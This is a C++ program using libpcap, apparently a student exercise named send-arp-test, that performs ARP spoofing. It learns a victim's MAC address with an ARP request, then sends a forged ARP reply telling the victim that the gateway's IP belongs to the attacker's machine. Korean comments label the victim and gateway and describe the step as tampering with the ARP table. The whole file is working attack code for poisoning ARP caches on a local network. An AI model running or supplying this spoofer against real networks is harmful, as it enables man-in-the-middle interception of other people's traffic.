#include <cstdio>
#include <pcap.h>
#include <stdlib.h>
#include <ifaddrs.h>
#include <linux/if_packet.h>
#include "header/ethhdr.h"
#include "header/arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

typedef struct HandlerData {
    pcap_t* handle;       // pcap 핸들
    char sender_mac[18];  // MAC 주소를 저장할 버퍼
};

typedef struct NetworkAddresses{
    char* macAddress;
    char* ipAddress;
};

void arp_reply_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) {
	HandlerData* data = (HandlerData*)user_data;

	PEthHdr eth_hdr = (PEthHdr)packet;
    
    // Ethernet 헤더의 type 필드를 확인하여 ARP 패킷인지 검사
    if (eth_hdr->type() != EthHdr::Arp) return;

	PArpHdr arp_hdr = (PArpHdr)(packet + sizeof(EthHdr)); // ARP 헤더 찾기
    
	if (arp_hdr->op() != ArpHdr::Reply) return; // ARP 응답이 아니면 반환

	// IP를 확인?
	
	snprintf(data->sender_mac, sizeof(data->sender_mac), "%02x:%02x:%02x:%02x:%02x:%02x",
             arp_hdr->smac_[0], arp_hdr->smac_[1], arp_hdr->smac_[2],
             arp_hdr->smac_[3], arp_hdr->smac_[4], arp_hdr->smac_[5]);
	pcap_breakloop(data->handle);
}

NetworkAddresses* getUserAddresses(const char* interface) {
    struct ifaddrs *ifaddr, *ifa;
    int family, s;
    char host[NI_MAXHOST];
    NetworkAddresses* addresses = (NetworkAddresses*)malloc(sizeof(NetworkAddresses));

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        exit(EXIT_FAILURE);
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL)
            continue;  

        s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

        if((strcmp(ifa->ifa_name,interface)==0)&&(ifa->ifa_addr->sa_family==AF_INET)) {
            if (s != 0) {
                printf("getnameinfo() failed: %s\n", gai_strerror(s));
                exit(EXIT_FAILURE);
            }
            addresses->ipAddress = strdup(host);
        }

        if ((strcmp(ifa->ifa_name, interface) == 0)&&(ifa->ifa_addr->sa_family == AF_PACKET)) {
            struct sockaddr_ll *s = (struct sockaddr_ll*)ifa->ifa_addr;
            asprintf(&addresses->macAddress, "%02x:%02x:%02x:%02x:%02x:%02x",
                     (int)s->sll_addr[0], (int)s->sll_addr[1], (int)s->sll_addr[2], 
                     (int)s->sll_addr[3], (int)s->sll_addr[4], (int)s->sll_addr[5]);
        }
    }

    freeifaddrs(ifaddr);
    return addresses;
}

void freeNetworkAddresses(NetworkAddresses* addresses) {
    if (addresses != nullptr) {
        free(addresses->macAddress);
        free(addresses->ipAddress);
        free(addresses);
    }
}

bool sendArpRequest(pcap_t* handle, const char* srcMac, const char* srcIp, const char* targetIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(srcMac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(srcMac);
    packet.arp_.sip_ = htonl(Ip(srcIp));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(targetIp));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

bool sendArpReply(pcap_t* handle, const char* srcMac, const char* srcIp, const char* targetMac, const char* targetIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(targetMac);
    packet.eth_.smac_ = Mac(srcMac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(srcMac);
    packet.arp_.sip_ = htonl(Ip(srcIp));
    packet.arp_.tmac_ = Mac(targetMac);
    packet.arp_.tip_ = htonl(Ip(targetIp));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return false;
    }
    return true;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// find my mac address and ip
	NetworkAddresses* addresses = getUserAddresses(dev);
		
	if(addresses->macAddress == nullptr){
		fprintf(stderr, "couldn't find your mac address\n");
		pcap_close(handle);
		return -1;
	}

	if(addresses->ipAddress == nullptr){
		fprintf(stderr, "couldn't find your IP address\n");
		pcap_close(handle);
		return -1;
	}

	for (int i = 2; i < argc; i += 2) {
		char* sender_ip = argv[i]; // victim
		char* target_ip = argv[i + 1]; // gateway

		HandlerData data;
		data.handle = handle;
		memset(data.sender_mac, 0, sizeof(data.sender_mac)); // MAC 주소 버퍼 초기화

		// 송신자의 MAC 주소를 얻기 위한 ARP 요청 보내기
		if (!sendArpRequest(handle, addresses->macAddress, addresses->ipAddress, sender_ip)) {
			fprintf(stderr, "Failed to send ARP request.\n");
			freeNetworkAddresses(addresses);
			pcap_close(handle);
			return -1;
		}

    	pcap_loop(handle, -1, arp_reply_handler, (u_char*)&data);

		if (data.sender_mac[0] == '\0') {
			fprintf(stderr, "Failed to retrieve sender's MAC address.\n");
			freeNetworkAddresses(addresses);
			pcap_close(handle);
			return -1;
		}

		// ARP table 변조
		if (!sendArpReply(handle, addresses->macAddress, target_ip, data.sender_mac, sender_ip)) {
			fprintf(stderr, "Failed to send ARP reply.\n");
			freeNetworkAddresses(addresses);
			pcap_close(handle);
			return -1;
		}
	}

	freeNetworkAddresses(addresses);
	pcap_close(handle);

	return 0;
}
